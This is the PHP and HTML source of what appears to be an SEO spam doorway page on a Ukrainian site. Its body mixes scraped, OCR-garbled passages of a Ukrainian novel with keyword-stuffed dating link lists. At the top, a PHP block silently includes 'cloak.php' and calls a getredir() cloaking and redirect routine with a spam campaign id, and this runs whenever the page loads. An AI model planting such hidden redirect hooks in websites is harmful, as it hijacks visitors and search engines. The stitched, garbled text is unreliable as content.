<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d1%96%d1%81%d1%8c%d0%ba%d1%96+%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b2+%d0%9a%d0%b0%d0%b4%d1%96%d1%97%d0%b2%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Загребельний Павло Архипович. Левине серце</title>
	<meta name="description" content="1 травня міська рада Стаханова планувала на Сході України, на яких тимчасово не діє українська влада." />
	<link rel="canonical" href="https://masage.od.ua/img/113/gycy-msk-shvidksn-znayomstva.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/qy-naykrash-mstsya-de.php">найкращі місця, де можна підключитись Путивль Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/xot-sayt-znayomstv.php">сайт знайомств поблизу Балаклія Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/vejy-populyarn-dodatki-dlya.php">популярні додатки для знайомств поблизу Овруч Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/syl-znayomstva-z-lyudinoyu.php">знайомства з людиною в Долинська Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Міські швидкісні знайомства в Кадіївка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<strong><a id='l1'></a><h2>Герої. Михайло Григорук</h2></strong><p>Кажуть, що одне 8 колін тих Загребельних прорвалося й до Італії, де модифікувалося в Загрібальді, а вже ті дали такого славного чоловіка, як Джу-зеппе Гарібальді. Природна скромність примушує автора вмовк-. Власне, автор і не хотів зачіпати цієї теми, але його мимоволі наштовхнули па неї, бо згодом приїздив він до Світлоярська з одною дуже шановною делегацією, такою шановною, що для належних пояснень їй по досить виявилося ні голови Зіньки Федорівни, ні дядька Зновобрать, а приїхали з-за мёж колгоспу товариші Вивершений і Багатогаласу.</p>
<p>Ну, а що в світлоярському колгоспі, як у Ноєвому ковчезі, було все: і жито, й пщениця, й кукурудза, і соняшник, і худоба, й свипі, й вівці, й копі, і кури, гуси, індики, кролі, навіть ондатри,— то розповідати було про що. Вивершений розповідав делегації, скільки колгосп дає сього та того, а Багатогаласу загинав пальці і підтакував:. Але делегація чи вже все знала, чи то якась дивна видалася. Ні про миргородських поросят, ні про яйце додаткових запитань пе задавала, а стала доиитуватися:.</p>
<p>На спеціалізацію переходить думаємо, а про козаків не можу вам сказати авторптетпо.</p><a id='l2'></a><h3>Навігаційне меню</h3><p>Може, товариш Багатогаласу пояснить. Все ж таки в автора цієї розповіді, мабуть, якась хвороблива пристрасть до історії. Через отого свого предка Сакребльо. От повезло чоловікові — мав такого предка. Зате потреби щоденні є, а людина живе потребами. Було — й нема. Архіви пе збереглися, бо до тримати? Українська хата під соломою, спалахує легко, горить дощенту,— як тут вбережеш оті архіви?</p>
<p>А до того й ховати ніде. Бо що таке хата? Там тісно й темпо, мишва з горища так і котиться, поточить архів на потерть.</p><strong><a id='l3'></a><h2>Кадіївка — Вікіпедія</h2></strong><p>В самій хаті тільки й місця, що під припічком, де нічого горючого не можна тримати з протипожежних міркувань, та ще за божницею, яка правила і за архіви, і за бібліотеки, і за весь інтелектуальний, сказати б, набуток. Але чи ж багато там вміститься? Та що атеїзм — які вже тут ікопи й божниці? Згодом автор переконався, що в Світлоярську історію пустили в обіг і навіть у щоденний побут, і хто хотів про неї тут довідатися, то мав починати своє вивчення не з офіційних кабінетів і пе з розпитувань дядька Обеліска, який належав до рекордсменів прямолінійного мислення, а із спокійного й неквапливого гшайом-ства з усім світлоярськпм, до речі кажучи, вельми складним світом.</p>
<p>Був тут Самійло Кішка, який обдирав котів і здавав шкурки як пушнину. Іван Брюховецький мав таке черево, як ночви завширшки. Щусі ж випросили якось у фельдше-риці бутель настойки подорожника і, замість лікуватися нею, випили всі три літри за одну піч, бо виявилося, що настойка на спирту, концентрацію мала підходящу, та ще й лікувальна — хто б тут утримався від спокуси!</p>
<p>Людипа в степу — це особлива категорія, може, ще й пе вивчена як слід. Сонце сходить у степу і заходить у степу, а ти зостаєшся. Може, був тут завжди і вічно? Ну, на Одещині був, кажуть, якийсь Овідій. Л тут?</p>
		
			<br><ol>
			
				<li>лесбіянки онлайн знайомства Бобринець Україна.</li>
			
				<li>Стахановський трамвай.</li>
			
				<li>ГАЛИЦЬКА ЗОРЯ.</li>
			
				<li>ГОТОВНІСТЬ НОМЕР ОДИН, ХОЧА І В ЗЕЛЕНІЙ ЗОНІ.</li>
			
				<li>знайомства з дівчатами в Горішні Плавні Україна.</li>
			
				<li>виконавчі побачення Токмак Україна.</li>
			
			</ol>
		
	<p>Сонце, вітри і ми… Земля дарує чудеса, жде від тебе праці й подиву і вчить високої гідності, яка пробивається в тобі могуттям думки і вмінням поглянути на світ примруженим оком. У Світлоярську враження склалося таке, що по вмів там сміятися тільки Самусь. Та коли чоловік не вміс сміятися, це ще пе означає, що йому чужі пристрасті, хвилювання, пал сердечний, який помагає йому виборювати своє, відстоювати, захищати, боротися й перемагать, щоб жити. Від того, що ми облишили Самусів і Щусів для вияснення деяких історичних моментів, пристрасті їхні не вгамувалися і суперництво, яке з несподіваною силою спалахнуло довкола макета, не припинилося.</p>
		
	<p>Боротьба розгорілася з неймовірною силою. Самусі й Щусі від словесних сунеречок перейшли до. Самусі тягли собі, Щусі — собі. Червоні обличчя, роззявлені роти, впрялеиі очі — суцільні пережитки проклятого капіталізму.</p><img src="https://3.bp.blogspot.com/-wnAMQo_luCA/V71xwpOlpwI/AAAAAAAAHD8/XCCoZ98pBvQv09JJ6h424gny3cm1iisNwCLcB/s640/asgas.png" alt="" style="max-width: 480px; max-height: 480px;"/><p>Столичний архітектор аж позадкував, як од віспп, щоб не заразишся родимими плямами. Дядько Зиовобрать мужньо кинувся поміж конфронтуючих і спробував вплинути па свідомість:. Товариші Щусі! З вас же всі люди сміються! Все прогресивне людство! Макет упав на підлогу. Па макет попадали Самусі й Щусі. Кублилися вже там. Зновобрать, влучивши момент, махнув рукою архітекторові, той вправно висмикнув з-під купи тіл свій макет, вопи мерщій занесли його до кабінету секретаря сільради, замкнули двері, тільїш тоді Щусі й Самусі схаменулися, довго відсапувалися, прокліиувалпея, після чого старий Самусь спитав старшого Щуся:.</p>
<p>Тоді настала колективна пауза, крізь яку стало чутпо гримотіння моторів, бо Допис Самусь приїхав до контори гусеничним трактором і не заглушив мотора, а Давидко так само не вимкнув мотора свого грузовика. Хотіли подіяти па своїх супротивників шумовими ефектами. Глава роду Щусі в якийсь час слухав ті падвір-ні мотори, сплюнув, сказав своєму старшому синові — лісникові Василеві Щусю:. Лч як ото нашошорилися! А ми свого пе віддамо! Товариш Зновобрать був падто досвідченим політичним діячем, щоб пе відчути, яка загроза ховається за цією, здавалося б, демократичною пропозицією Щусів і Самусів.</p>
<p>Він одразу оголосив сільський актив закритим і замкнувся в своему кабінеті з архітектором, головою колгоспу Зінккою Федорівпою і секретарем парт-оргапізації Грицьком Грицьковичем. Щусі й Самусі весь колгосп розполовинять, і ніколи ми пе дійдемо згоди. І знов загрп. І дає тобі безплатну путівку. Там, кажуть, спальня є, де цариця спала. Цілий день сонце. Вікна так влаштовано, що сонце цілий день кружляє і зазирає в них. Для рівноваги. Самусь їде, хай їде і Щусь!</p>
<p>Самусь підвівся, показуючи, тцо розмову він закінчив і від свого не відступиться. Зновобрать спробував поторгуватися. Несміливо поглянули всі на архітектора, ало той був ще надто молодий, щоб знайти вихід з такого заплутаного становища. Врешті наважився Грицько Грицькович.</p>
		
			<br><ul>
			
				<li>Щербицький Володимир Васильович. Політичний портрет на фоні епохи - ?</li>
			
				<li>знайомства з хлопцем в Калинівка Україна!</li>
			
				<li>МЕДІАГРАМОТНІСТЬ В ОСВІТНЬОМУ ПРОСТОРІ КАМ'ЯНЦЯ-ПОДІЛЬСЬКОГО.</li>
			
				<li>просто обідні побачення поруч Вознесенівка Україна.</li>
			
				<li>хвилинні побачення Чорноморськ Україна.</li>
			
				<li>Загребельний Павло Архипович. Вигнання з раю;</li>
			
			</ol>
		
	<p>Самуся відправимо, Щусь буде що тут. Голосування дасть результат. То як? Кликати лісника? Поїдеш у санаторій па Південному березі Криму. Там така краса, що тобі й пе снилося.</p>
		
			<br><ol>
			
				<li>Інтернет знайомства поблизу Українськ Україна.</li>
			
				<li>Юрий Чекоз: записи профиля | ВКонтакте?</li>
			
				<li>Суспільство.</li>
			
				<li>.</li>
			
				<li>!</li>
			
				<li>Погода у Кадіївці (Стаханові);</li>
			
			</ol>
		
	
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/377/jufy-veb-sayt-pdklyuchennya.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/377/nagut-sluzhba-znayomstv.php">служба знайомств в Ромни Україна</a></li><li><a href="https://masage.od.ua/img/418/puzi-vs-sayti.php">всі сайти знайомств в Апостолове Україна</a></li><li><a href="https://masage.od.ua/img/467/tytod-plyazh-pdklyuchiti.php">пляж підключити в Скадовськ Україна</a></li><li><a href="https://masage.od.ua/img/313/qiqos-znayomstva-z-zhnkoyu.php">знайомства з жінкою в Костянтинівка Україна</a></li><li><a href="https://masage.od.ua/img/327/moli-znayomstva-z.php">знайомства зі старшими Сєвєродонецьк Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#l1'>Герої. Михайло Григорук</a></li>
<li><a href='#l2'>Навігаційне меню</a></li>
<li><a href='#l3'>Кадіївка — Вікіпедія</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/377/faju-zahdn-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>